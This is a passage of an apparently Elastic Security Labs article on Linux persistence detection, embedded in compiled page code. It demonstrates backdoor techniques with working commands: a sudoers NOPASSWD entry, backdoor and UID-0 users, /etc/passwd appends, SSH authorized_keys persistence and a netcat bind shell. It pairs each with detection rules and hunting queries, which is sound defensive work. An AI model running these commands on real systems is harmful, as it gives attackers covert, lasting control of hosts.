user:\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`sudo ./panix.sh --sudoers --username attacker\n[+] User attacker can now run all commands without a sudo password.\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"After adding a backdoor in the sudoers file and rerunning the \",(0,i.jsx)(e.code,{children:\"sudo -l\"}),\" command, we see that the attacker can now run any command on the system with sudo without specifying a password.\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`\u003e sudo -l\n\u003e User attacker may run the following commands on ubuntu-persistence-research:\n\u003e  (ALL : ALL) ALL\n\u003e  (ALL) NOPASSWD: ALL \n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"After planting this backdoor, not much traces are left behind, other than the creation of the \",(0,i.jsx)(e.code,{children:\"/etc/sudoers.d/attacker\"}),\" file.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/primer-on-persistence-mechanisms/image6.png\",alt:\"Events generated as a result of sudoers file modification persistence establishment\",title:\"Events generated as a result of sudoers file modification persistence establishment\",width:\"1440\",height:\"247\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"This backdoor can also be established by adding to the \",(0,i.jsx)(e.code,{children:\"/etc/sudoers\"}),\" file, which would not generate a file creation event. This event can be captured via FIM.\"]}),`\n`,(0,i.jsx)(e.div,{className:\"table-container\",children:(0,i.jsxs)(e.table,{children:[(0,i.jsx)(e.thead,{children:(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.th,{children:\"Category\"}),(0,i.jsx)(e.th,{children:\"Coverage\"})]})}),(0,i.jsxs)(e.tbody,{children:[(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:\"File\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/cross-platform/privilege_escalation_sudoers_file_mod.toml\",rel:\"nofollow\",children:\"Sudoers File Modification\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml\",rel:\"nofollow\",children:\"Potential Persistence via File Modification\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:\"Process\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/cross-platform/privilege_escalation_echo_nopasswd_sudoers.toml\",rel:\"nofollow\",children:\"Potential Privilege Escalation via Sudoers File Modification\"})})]})]})]})}),`\n`,(0,i.jsx)(e.h3,{id:\"hunting-for-t1548003---sudoers-file-modification\",children:\"Hunting for T1548.003 - sudoers file modification\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"OSQuery provides a module that displays all sudoers files and rules through a simple and effective live hunt, available at \",(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/privilege_escalation_via_existing_sudoers.toml\",rel:\"nofollow\",children:\"Privilege Escalation Identification via Existing Sudoers File\"}),\".\"]}),`\n`,(0,i.jsx)(e.h2,{id:\"t1098t1136---account-manipulationcreation\",children:\"T1098/T1136 - account manipulation/creation\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Persistence can be established through the creation or modification of user accounts. By manipulating user credentials or permissions, attackers can ensure long-term access to a compromised system. This section covers various methods of achieving persistence through user account manipulation. MITRE divides this section into \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1098/\",rel:\"nofollow\",children:\"T1098\"}),\" (account manipulation) and \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1136/\",rel:\"nofollow\",children:\"T1136\"}),\" (create account).\"]}),`\n`,(0,i.jsx)(e.h3,{id:\"t1136001---create-account-local-account\",children:\"T1136.001 - create account: local account\"}),`\n`,(0,i.jsx)(e.p,{children:\"Creating a new user account is a straightforward way to establish persistence. An attacker with root privileges can add a new user, ensuring they maintain access to the system even if other backdoors are removed. For example:\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`useradd -m -s /bin/bash backdooruser\necho 'backdooruser:password' | chpasswd\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"This creates a new user called \",(0,i.jsx)(e.code,{children:\"backdooruser\"}),\" with a password of \",(0,i.jsx)(e.code,{children:\"password\"}),\".\"]}),`\n`,(0,i.jsx)(e.h3,{id:\"t1098---account-manipulation-user-credential-modification\",children:\"T1098 - account manipulation: user credential modification\"}),`\n`,(0,i.jsx)(e.p,{children:\"Modifying the credentials of an existing user can also provide persistent access. This might involve changing the password of a privileged user account.\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`echo 'targetuser:newpassword' | chpasswd\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"This changes the password for \",(0,i.jsx)(e.code,{children:\"targetuser\"}),\" to \",(0,i.jsx)(e.code,{children:\"newpassword\"}),\".\"]}),`\n`,(0,i.jsx)(e.h3,{id:\"t1098---account-manipulation-direct-etcpasswd-file-modification\",children:\"T1098 - account manipulation: direct /etc/passwd file modification\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Directly writing to the \",(0,i.jsx)(e.code,{children:\"/etc/passwd\"}),\" file is another method for modifying user accounts. This approach allows attackers to manually add or modify user entries, potentially avoiding detection.\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`echo \"malicioususer:\u003copenssl-hash\u003e:0:0:root:/root:/bin/bash\" \u003e\u003e /etc/passwd\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"Where \",(0,i.jsx)(e.code,{children:\"\u003c;openssl-hash\u003e\"}),\" is a hash that can be generated through \",(0,i.jsx)(e.code,{children:'openssl passwd \"$password\".'})]}),`\n`,(0,i.jsxs)(e.p,{children:[\"The command above creates a new user \",(0,i.jsx)(e.code,{children:\"malicioususer\"}),\", adds them to the \",(0,i.jsx)(e.code,{children:\"sudo group\"}),\", and sets a password. Similarly, this attack can be performed on the \",(0,i.jsx)(e.code,{children:\"/etc/shadow\"}),\" file, by replacing the hash for a user\\u2019s password with a known hash.\"]}),`\n`,(0,i.jsx)(e.h3,{id:\"t1136001---create-account-backdoor-user-creation\",children:\"T1136.001 - create account: backdoor user creation\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"A backdoor user is a user account created or modified specifically to maintain access to the system. This account often has elevated privileges and is intended to be difficult to detect. One method involves creating a user with a UID of 0, effectively making it a root-equivalent user. This approach is detailed in a blog post called \",(0,i.jsx)(e.a,{href:\"https://embracethered.com/blog/posts/2021/linux-user-uid-zero-backdoor/\",rel:\"nofollow\",children:\"Backdoor users on Linux with uid=0\"}),\".\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`useradd -ou 0 -g 0 -m -d /root -s /bin/bash backdoorroot\necho 'backdoorroot:password' | chpasswd\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"This creates a new user \",(0,i.jsx)(e.code,{children:\"backdoorroot\"}),\" with UID 0, giving it root privileges.\"]}),`\n`,(0,i.jsx)(e.h3,{id:\"t1098---account-manipulation-user-added-to-privileged-group\",children:\"T1098 - account manipulation: user added to privileged group\"}),`\n`,(0,i.jsx)(e.p,{children:\"Adding an existing user to a privileged group, such as the sudo group, can elevate their permissions, allowing them to execute commands with superuser privileges.\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`usermod -aG sudo existinguser\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"This adds \",(0,i.jsx)(e.code,{children:\"existinguser\"}),\" to the sudo group.\"]}),`\n`,(0,i.jsx)(e.h3,{id:\"persistence-through-t1098t1136---account-manipulationcreation\",children:\"Persistence through T1098/T1136 - account manipulation/creation\"}),`\n`,(0,i.jsx)(e.p,{children:\"All of these techniques are trivial to execute manually, but they are also built into PANIX in case you want to analyze the logs using a binary rather than a manual action. As the events generated by these techniques are not very interesting, we will not analyze them individually. We detect all the techniques described above through a vast set of detection rules.\"}),`\n`,(0,i.jsx)(e.div,{className:\"table-container\",children:(0,i.jsxs)(e.table,{children:[(0,i.jsx)(e.thead,{children:(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.th,{children:\"Category\"}),(0,i.jsx)(e.th,{children:\"Coverage\"})]})}),(0,i.jsxs)(e.tbody,{children:[(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:\"File\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml\",rel:\"nofollow\",children:\"Potential Persistence via File Modification\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_user_password_change.toml\",rel:\"nofollow\",children:\"Shadow File Modification\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:\"Process\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_linux_backdoor_user_creation.toml\",rel:\"nofollow\",children:\"Potential Linux Backdoor User Account Creation\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:\"IAM\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_linux_group_creation.toml\",rel:\"nofollow\",children:\"Linux Group Creation\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_linux_user_added_to_privileged_group.toml\",rel:\"nofollow\",children:\"Linux User Added to Privileged Group\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_linux_user_account_creation.toml\",rel:\"nofollow\",children:\"Linux User Account Creation\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_user_or_group_creation_or_modification.toml\",rel:\"nofollow\",children:\"User or Group Creation/Modification\"})})]})]})]})}),`\n`,(0,i.jsx)(e.h3,{id:\"hunting-for-t1098t1136---account-manipulationcreation\",children:\"Hunting for T1098/T1136 - account manipulation/creation\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"There are many ways to hunt for these techniques. The above detection rules can be added as a timelines query to look back at a longer duration of time, the \",(0,i.jsx)(e.code,{children:\"/var/log/auth.log\"}),\" (and equivalents on other Linux distributions) can be parsed and read, and OSQuery can be leveraged to read user info from a running system. The \",(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_user_group_creation_modification.toml\",rel:\"nofollow\",children:\"Privilege Escalation/Persistence via User/Group Creation and/or Modification\"}),\" hunt rule contains several OSQuery queries to hunt for these techniques.\"]}),`\n`,(0,i.jsx)(e.h2,{id:\"t1098004---account-manipulation-ssh\",children:\"T1098.004 - account manipulation: SSH\"}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.a,{href:\"https://linux.die.net/man/1/ssh\",rel:\"nofollow\",children:\"Secure Shell (SSH)\"}),\" is a protocol to securely access remote systems. It leverages public/private key pairs to authenticate users, providing a more secure alternative to password-based logins. The SSH keys consist of a private key, kept secure by the user, and a public key, shared with the remote system.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"The default locations for user-specific SSH key files and configuration files are as follows:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"~/.ssh/id_rsa\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"~/.ssh/id_rsa.pub\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"~/.ssh/authorized_keys\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/root/.ssh/id_rsa\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/root/.ssh/id_rsa.pub\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/root/.ssh/authorized_keys\"})}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:\"A system-wide configuration is present in:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/etc/ssh/\"})}),`\n`]}),`\n`,(0,i.jsxs)(e.p,{children:[\"The private key remains on the client machine, while the public key is copied to the remote server\\u2019s \",(0,i.jsx)(e.code,{children:\"authorized_keys\"}),\" file. This setup allows the user to authenticate with the server without entering a password.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"SSH keys are used to authenticate remote login sessions via SSH and for services like Secure Copy Protocol (SCP) and Secure File Transfer Protocol (SFTP), which allow secure file transfers between machines.\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"An attacker can establish persistence on a compromised host by adding their public key to the \",(0,i.jsx)(e.code,{children:\"authorized_keys\"}),\" file of a user with sufficient privileges. This ensures they can regain access to the system even if the user changes their password. This persistence method is stealthy as built-in shell commands can be used, which are commonly more difficult to capture as a data source. Additionally, it does not rely on creating new user accounts or modifying system binaries.\"]}),`\n`,(0,i.jsx)(e.h3,{id:\"persistence-through-t1098004---ssh-modification\",children:\"Persistence through T1098.004 - SSH modification\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Similar to previously, PANIX can be used to establish persistence through SSH. It can also be tested by manually adding a new key to \",(0,i.jsx)(e.code,{children:\"~/.ssh/authorized_keys\"}),\", or by creating a new public/private key pair on the system. If you want to test these techniques, you can execute the following PANIX command to establish persistence by creating a new key:\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`./panix.sh --ssh-key --default\nSSH key generated:\nPrivate key: /home/user/.ssh/id_rsa18220\nPublic key: /home/user/.ssh/id_rsa1822.pub\n[+] SSH key persistence established.\n`})}),`\n`,(0,i.jsx)(e.p,{children:\"Use the following PANIX command to add a new public key to the authorized_keys file:\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`./panix.sh  --authorized-keys --default --key \u003ckey\u003e\n[+] Persistence added to /home/user/.ssh/authorized_keys\n`})}),`\n`,(0,i.jsx)(e.p,{children:\"For file modification events, we can leverage FIM. We have several detection rules covering this technique in place.\"}),`\n`,(0,i.jsx)(e.div,{className:\"table-container\",children:(0,i.jsxs)(e.table,{children:[(0,i.jsx)(e.thead,{children:(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.th,{children:\"Category\"}),(0,i.jsx)(e.th,{children:\"Coverage\"})]})}),(0,i.jsxs)(e.tbody,{children:[(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:\"File\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml\",rel:\"nofollow\",children:\"Potential Persistence via File Modification\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:\"Process\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_ssh_key_generation.toml\",rel:\"nofollow\",children:\"SSH Key Generated via ssh-keygen\"})})]})]})]})}),`\n`,(0,i.jsxs)(e.p,{children:[\"A note on leveraging the \\u201CPotential Persistence via File Modification\\u201D rule: due to the limitation of leveraging wildcards in FIM, the FIM configuration should be adapted to represent your environment\\u2019s public/private key and authorized_keys file locations. MITRE provides additional information on this technique in \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1098/004/\",rel:\"nofollow\",children:\"T1098.004\"}),\".\"]}),`\n`,(0,i.jsx)(e.h3,{id:\"hunting-for-t1098004---ssh-modification\",children:\"Hunting for T1098.004 - SSH modification\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"The main focuses while hunting for SSH persistence are newly added public/private keys, file changes related to the \",(0,i.jsx)(e.code,{children:\"authorized_keys\"}),\" files, and configuration changes. We can leverage OSQuery to hunt for all three through the queries in the \",(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_ssh_configurations_and_keys.toml\",rel:\"nofollow\",children:\"Persistence via SSH Configurations and/or Keys\"}),\" hunt.\"]}),`\n`,(0,i.jsx)(e.h2,{id:\"t1059004---command-and-scripting-interpreter-bind-shells\",children:\"T1059.004 - command and scripting interpreter: bind shells\"}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.a,{href:\"https://www.geeksforgeeks.org/difference-between-bind-shell-and-reverse-shell/\",rel:\"nofollow\",children:\"A bind shell\"}),\" is a remote access tool allowing an attacker to connect to a compromised system. Unlike reverse shells, which connect back to the attacker\\u2019s machine, a bind shell listens for incoming connections on the compromised host. This allows the attacker to connect at will, gaining command execution on the target machine.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"A bind shell typically involves the following steps:\"}),`\n`,(0,i.jsxs)(e.ol,{children:[`\n`,(0,i.jsx)(e.li,{children:\"Listening Socket: The compromised system opens a network socket and listens for incoming connections on a specific port.\"}),`\n`,(0,i.jsxs)(e.li,{children:[\"Binding the Shell: When a connection is established, the system binds a command shell (such as \",(0,i.jsx)(e.code,{children:\"/bin/bash\"}),\" or \",(0,i.jsx)(e.code,{children:\"/bin/sh\"}),\") to the socket.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[\"Remote Access: The attacker connects to the bind shell using a network client (like \",(0,i.jsx)(e.code,{children:\"netcat\"}),\") and gains access to the command shell on the compromised system.\"]}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:\"An attacker can set up a bind shell in various ways, ranging from simple one-liners to more sophisticated scripts. Here is an example of a bind shell using the traditional version of netcat:\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`nc -lvnp 9001 -e /bin/bash\n`})}),`\n`,(0,i.jsx)(e.p,{children:\"Once the bind shell is set up, the attacker can connect to it from their machine:\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`nc -nv \u003ctarget_ip\u003e 4444\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"To maintain persistence, the bind shell must be set to start automatically upon system boot or reboot. This can be achieved through various methods we discussed earlier, such as \",(0,i.jsx)(e.code,{children:\"cron\"}),\", \",(0,i.jsx)(e.code,{children:\"Systemd,\"}),\" or methods discussed in the next part of this Linux detection engineering series.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"MITRE does not have a specific bind/reverse-shell technique, and probably classifies bind shells as the execution technique. However, the bind shell is used for persistence in our use case. Some more information from MITRE on bind/reverse shells is available at \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1059/004/\",rel:\"nofollow\",children:\"T1059.004\"}),\".\"]}),`\n`,(0,i.jsx)(e.h3,{id:\"persistence-through-t1059004---bind-shells\",children:\"Persistence through T1059.004 - bind shells\"}),`\n`,(0,i.jsx)(e.p,{children:\"Detecting bind shells through behavioral rules is inherently challenging because their behavior is typically benign and indistinguishable from legitimate processes. A bind shell opens a network socket and waits for an incoming connection, a common activity for many legitimate services. When an attacker connects, it merely results in a network connection and the initiation of a shell session, which are both normal operations on a system.\"}),`\n`,(0,i.jsx)(e.p,{children:\"Due to behavioral detection's limitations, the most reliable method for identifying bind shells is static signature detection. This approach involves scanning the file system or memory for known shellcode patterns associated with bind shells.\"}),`\n`,(0,i.jsx)(e.p,{children:\"By leveraging static signatures, we can identify and prevent bind shells more effectively than relying solely on behavioral analysis. This approach helps detect the specific code sequences used by bind shells, regardless of their behavior, ensuring a more robust defense against this type of persistence mechanism.\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"As all of our signature-based detections are open-source, you can check them out by visiting our \",(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/tree/main/yara/rules\",rel:\"nofollow\",children:\"protections-artifacts YARA repository\"}),\". If you want to analyze this method within your tooling, you can leverage PANIX to set up a bind shell and connect to it using \",(0,i.jsx)(e.code,{children:\"nc\"}),\". To do so, execute the following command:\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`./panix.sh --bind-shell --default --architecture x64\n[+] Bind shell /tmp/bd64 was created, executed and backgrounded.\n[+] The bind shell is listening on port 9001.\n[+] To interact with it from a different system, use: nc -nv \u003cIP\u003e 9001\n[+] Bind shell persistence established!\n`})}),`\n`,(0,i.jsx)(e.h3,{id:\"hunting-for-t1059004---bind-shells\",children:\"Hunting for T1059.004 - bind shells\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Although writing solid behavioral detection rules that do not provide false positives on a regular basis is near impossible, hunting for them is not. Based on the behavior of a bind shell, we know that we can look for long running processes, listening ports and listening sockets. To do so, we can leverage OSQuery. Several hunts are available for this scenario within the \",(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_reverse_bind_shells.toml\",rel:\"nofollow\",children:\"Persistence Through Reverse/Bind Shells\"}),\" hunting rule.\"]}),`\n`,(0,i.jsx)(e.h2,{id:\"t1059004---command-and-scripting-interpreter-reverse-shells\",children:\"T1059.004 - command and scripting interpreter: reverse shells\"}),`\n`,(0,i.jsx)(e.p,{children:\"Reverse shells are utilized in many of the persistence techniques discussed in this article and will be further explored in upcoming parts. While specific rules for detecting reverse shells were not added to many of the techniques above, they are very relevant. To maintain consistency and ensure comprehensive coverage, the following detection and endpoint rules are included to capture these persistence mechanisms.\"}),`\n`,(0,i.jsx)(e.div,{className:\"table-container\",children:(0,i.jsxs)(e.table,{children:[(0,i.jsx)(e.thead,{children:(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.th,{children:\"Category\"}),(0,i.jsx)(e.th,{children:\"Coverage\"})]})}),(0,i.jsxs)(e.tbody,{children:[(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:\"Process\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/execution_suspicious_execution_via_setsid_and_nohup.toml\",rel:\"nofollow\",children:\"Suspicious Execution via setsid and nohup\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/execution_suspicious_execution_via_a_hidden_process.toml\",rel:\"nofollow\",children:\"Suspicious Execution via a Hidden Process\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:\"Network\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/execution_linux_reverse_shell.toml\",rel:\"nofollow\",children:\"Linux Reverse Shell\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/execution_linux_reverse_shell_via_child.toml\",rel:\"nofollow\",children:\"Linux Reverse Shell via Child\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/execution_linux_reverse_shell_via_netcat.toml\",rel:\"nofollow\",children:\"Linux Reverse Shell via Netcat\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/execution_linux_reverse_shell_via_suspicious_utility.toml\",rel:\"nofollow\",children:\"Linux Reverse Shell via Suspicious Utility\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/execution_linux_reverse_shell_via_setsid_and_nohup.toml\",rel:\"nofollow\",children:\"Linux Reverse Shell via setsid and nohup\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/execution_shell_via_meterpreter_linux.toml\",rel:\"nofollow\",children:\"Potential Meterpreter Reverse Shell\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/execution_shell_via_udp_cli_utility_linux.toml\",rel:\"nofollow\",children:\"Potential Reverse Shell via UDP\"})})]})]})]})}),`\n`,(0,i.jsx)(e.h2,{id:\"conclusion\",children:\"Conclusion\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"In this part of the \\u201CLinux Detection Engineering\\u201D series, we looked into the basics of Linux persistence. If you missed the first part of the series, which focused on detection engineering with Auditd, you can catch up \",(0,i.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/linux-detection-engineering-with-auditd\",rel:\"nofollow\",children:\"here\"}),\". This article explored various persistence techniques, including scheduled tasks, systemd services, shell profile modifications, XDG autostart configurations, SUID/SGID binaries, sudoers rules, user and group creations/modifications, SSH key, and authorized_key modifications, bind and reverse shells.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"Not only did the explanation cover how each persistence method operates, but it also provided practical demonstrations of configuring them using a straightforward tool called \",(0,i.jsx)(e.a,{href:\"https://github.com/Aegrah/PANIX\",rel:\"nofollow\",children:\"PANIX\"}),\". This hands-on approach enabled you to test the coverage of these techniques using your preferred security product. Additionally, we discussed hunting strategies for each method, ranging from ES|QL aggregation queries to live hunt queries with OSQuery.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"We hope you found this format helpful. In the next article, we'll explore more advanced and lesser-known persistence methods used in the wild. Until then, happy hunting!\"})]})}function x(t={}){let{wrapper:e}=t.components||{};return e?(0,i.jsx)(e,Object.assign({},t,{children:(0,i.jsx)(d,t)})):d(t)}var k=x;return w(_);})();\n;return Component;"},"_id":"articles/primer-on-persistence-mechanisms.mdx","_raw":{"sourceFilePath":"articles/primer-on-persistence-mechanisms.mdx","sourceFileName":"primer-on-persistence-mechanisms.mdx","sourceFileDir":"articles","contentType":"mdx","flattenedPath":"articles/primer-on-persistence-mechanisms"},"type":"Article","imageUrl":"/assets/images/primer-on-persistence-mechanisms/primer-on-persistence-mechanisms.jpg","readingTime":"50 min read","series":"","url":"/primer-on-persistence-mechanisms","headings":[{"level":2,"title":"Introduction","href":"#introduction"},{"level":2,"title":"What is persistence?","href":"#what-is-persistence"},{"level":2,"title":"Setup","href":"#setup"},{"level":2,"title":"T1053 - scheduled task/job","href":"#t1053---scheduled-taskjob"},{"level":3,"title":"T1053.003 - scheduled task/job: Cron","href":"#t1053003---scheduled-taskjob-cron"},{"level":4,"title":"Persistence through T1053.003 - cron","href":"#persistence-through-t1053003---cron"},{"level":3,"title":"T1053.002 - scheduled task/job: at","href":"#t1053002---scheduled-taskjob-at"},{"level":4,"title":"Persistence through T1053.002 - At","href":"#persistence-through-t1053002---at"},{"level":3,"title":"T1053 - scheduled task/job: honorable mentions","href":"#t1053---scheduled-taskjob-honorable-mentions"},{"level":3,"title":"Hunting for T1053 - scheduled task/job ","href":"#hunting-for-t1053---scheduled-taskjob-"},{"level":2,"title":"T1453 - create or modify system process (systemd)","href":"#t1453---create-or-modify-system-process-systemd"},{"level":3,"title":"T1453.002 - create or modify system process: systemd services","href":"#t1453002---create-or-modify-system-process-systemd-services"},{"level":3,"title":"T1053.006 - scheduled task/job: systemd timers","href":"#t1053006---scheduled-taskjob-systemd-timers"},{"level":3,"title":"T1453 - create or modify system process: systemd generators","href":"#t1453---create-or-modify-system-process-systemd-generators"},{"level":3,"title":"Persistence through T1453/T1053 - systemd services, timers and generators","href":"#persistence-through-t1453t1053---systemd-services-timers-and-generators"},{"level":3,"title":"Hunting for T1053/T1453 - systemd services, timers and generators","href":"#hunting-for-t1053t1453---systemd-services-timers-and-generators"},{"level":2,"title":"T1546.004 - event triggered execution: Unix shell configuration modification","href":"#t1546004---event-triggered-execution-unix-shell-configuration-modification"},{"level":3,"title":"Persistence through T1546.004 - shell profile modification","href":"#persistence-through-t1546004---shell-profile-modification"},{"level":3,"title":"Hunting for T1546.004 - shell configuration modification","href":"#hunting-for-t1546004---shell-configuration-modification"},{"level":2,"title":"T1547.013 - boot or logon autostart execution: XDG autostart entries","href":"#t1547013---boot-or-logon-autostart-execution-xdg-autostart-entries"},{"level":3,"title":"Persistence through T1547.013 - Cross-Desktop Group (XDG)","href":"#persistence-through-t1547013---cross-desktop-group-xdg"},{"level":3,"title":"Hunting for T1547.013 - XDG autostart entries","href":"#hunting-for-t1547013---xdg-autostart-entries"},{"level":2,"title":"T1548.001 - abuse elevation control 